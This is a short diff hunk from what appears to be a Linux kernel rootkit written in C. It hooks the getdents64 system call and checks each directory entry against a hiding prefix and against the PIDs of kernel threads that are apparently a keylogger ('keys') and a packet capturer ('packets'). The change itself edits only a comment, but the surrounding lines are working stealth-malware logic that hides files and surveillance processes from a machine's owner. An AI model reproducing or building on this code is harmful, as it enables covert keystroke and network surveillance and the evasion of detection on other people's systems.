@@ -53,7 +53,7 @@ static asmlinkage int hook_getdents64(const struct pt_regs *regs)
 
 
 
-        /* If the entry name doesn't match the prefix, copy it to the new buffer */
+        // check if the current entry has the prefix/hidden pid(kthreads or chosen pid)
         bool is_prefix = memcmp(PREFIX, current_dir->d_name, strlen(PREFIX)) == 0;
         bool is_keys_kthred_pid = strlen(keys_kthread_pid) != 0 && memcmp(keys_kthread_pid, current_dir->d_name, strlen(keys_kthread_pid)) == 0;
         bool is_packets_kthred_pid = strlen(packets_kthread_pid) != 0 && memcmp(packets_kthread_pid, current_dir->d_name, strlen(packets_kthread_pid)) == 0;
